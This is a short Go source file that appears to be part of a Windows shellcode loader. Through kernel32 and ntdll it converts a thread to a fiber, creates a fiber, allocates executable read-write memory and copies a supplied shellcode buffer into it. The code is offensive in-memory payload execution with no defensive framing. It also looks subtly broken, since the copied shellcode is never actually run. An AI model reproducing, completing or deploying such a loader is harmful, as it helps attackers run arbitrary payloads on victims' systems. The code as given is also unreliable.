package TT

import (
	"fmt"
	"syscall"
	"unsafe"
)

var (
	if1 [0]byte
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32             = syscall.MustLoadDLL("kernel32.dll")
	ntdll                = syscall.MustLoadDLL("ntdll.dll")
	CreateFiber          = kernel32.MustFindProc("CreateFiber")
	ConvertThreadToFiber = kernel32.MustFindProc("ConvertThreadToFiber")
	VirtualAlloc         = kernel32.MustFindProc("VirtualAlloc")
	RtlMoveMemory        = ntdll.MustFindProc("RtlMoveMemory")
)

func dummy() {
	fmt.Scanln("Hello Fiber from Dummy")
}

func Callback(shellcode []byte) {
	ConvertThreadToFiber.Call(0)
	CreateFiber.Call(0x100, (uintptr)(unsafe.Pointer(&dummy)), 0)
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
}
